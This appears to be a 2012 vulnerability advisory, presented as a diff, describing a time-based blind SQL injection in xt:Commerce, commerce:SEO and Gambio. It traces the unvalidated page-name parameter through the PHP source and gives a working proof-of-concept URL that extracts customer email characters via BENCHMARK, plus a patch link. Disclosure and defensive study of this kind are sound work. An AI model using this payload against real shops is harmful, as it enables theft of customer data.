@@ -1,0 +1,80 @@
++---------------------------------+
+| xt:Commerce <= v3.04 SP2.1      |
+| commerce:SEO <= v2.1 CE         |
+| Gambio <= v2.0.10 SP1.4         |
+| Time Based Blind SQL Injection  |
++---------------------------------+
+
+Author.............: Ralf Zimmermann 
+Mail...............: info[AT]stoffline.com
+Vendor Homepage....: http://www.xt-commerce.com/
+Software Link......: http://www.xtc-load.de/2008/07/xtcommerce-v304-sp21/
+Affected Version...: xt:Commerce <= v3.04 SP2.1, commerce:SEO <= v2.1 CE, Gambio <= v2.0.10 SP1.4
+URL http://stoffline.com/golb/details-zur-sicherheitslucke-in-xtcommerce/ (german)
+URL http://stoffline.com/golb/sicherheitslucke-in-xtcommerce/ (german)
+Date...............: 12/06/2012
+
+-----------------------------------------------------------
+       Author will be not responsible for any damage.
+-----------------------------------------------------------
+I. DESCRIPTION
+-----------------------------------------------------------
+
+# we need to be logged in as a regular customer...
+
+admin/backup.php
+  18: require('includes/application_top.php');
+
+admin/includes/application_top.php
+  399: $current_page = split('\?', basename($_SERVER['PHP_SELF'])); $current_page = $current_page[0]; // for BadBlue(Win32) webserver compatibility
+  # if you go to
+  # http://127.0.0.1/xtc_304SP21/admin/backup.php/test.php?
+  # $current_page = 'test.php' instead of 'backup.php' cause AcceptPathInfo from Apache passes the entire path
+
+  486: $pagename = strtok($current_page, '.');
+  # $pagename = 'test';
+
+  487: if (!isset($_SESSION['customer_id'])) {
+  488:  xtc_redirect(xtc_href_link(FILENAME_LOGIN));
+  489: }
+  # We need to be logged in but we walk through this checkpoint regardless of our customer status
+
+  491: if (xtc_check_permission($pagename) == '0') {
+  492:  xtc_redirect(xtc_href_link(FILENAME_LOGIN));
+  493: }
+
+admin/includes/functions/general.php
+  110: function xtc_check_permission($pagename) {
+  111:  if ($pagename != 'index') {
+  112:   $access_permission_query = xtc_db_query("select ".$pagename." from ".TABLE_ADMIN_ACCESS." where customers_id = '".$_SESSION['customer_id']."'");
+  113:   $access_permission = xtc_db_fetch_array($access_permission_query);
+  114:
+  115:   if (($_SESSION['customers_status']['customers_status_id'] == '0')&& ($access_permission[$pagename] == '1')) {
+  116:    return true;
+  117:   } else {
+  118:    return false;
+  119:   }
+  120:  } else {
+  121:   xtc_redirect(xtc_href_link(FILENAME_LOGIN));
+  122:  }
+  123: }
+  # $pagename comes in the query with no validation
+  # select test from admin_access where customer_id = 2
+
+  # Every valid SQL query ends with a redirect to the login page.
+  # We can use time based MySQL commands like Benchmark to exploit the vulnerability.
+  # The PoC checks if the first character from the customers email adress is 'a'.
+  # If so, the query will consume a lot of time e.G. 10 seconds, if not, we will directly redirected to the login page
+
+-----------------------------------------------------------
+
+II. PoC EXPLOIT
+-----------------------------------------------------------
+http://127.0.0.1/xtc_304SP21/admin/backup.php/IF((SELECT%20ASCII(SUBSTR(customers_email_address,1,1))%20FROM%20customers%20WHERE%20customers_id=1)=97,BENCHMARK(100000000,MD5(1)),1)--%20.php?
+-----------------------------------------------------------
+
+III. Solution:
+-----------------------------------------------------------
+Patches can be found here:
+http://www.xtc-load.de/2012/06/wichtiges-security-update-fur-alle-xtc-forks/
+-----------------------------------------------------------
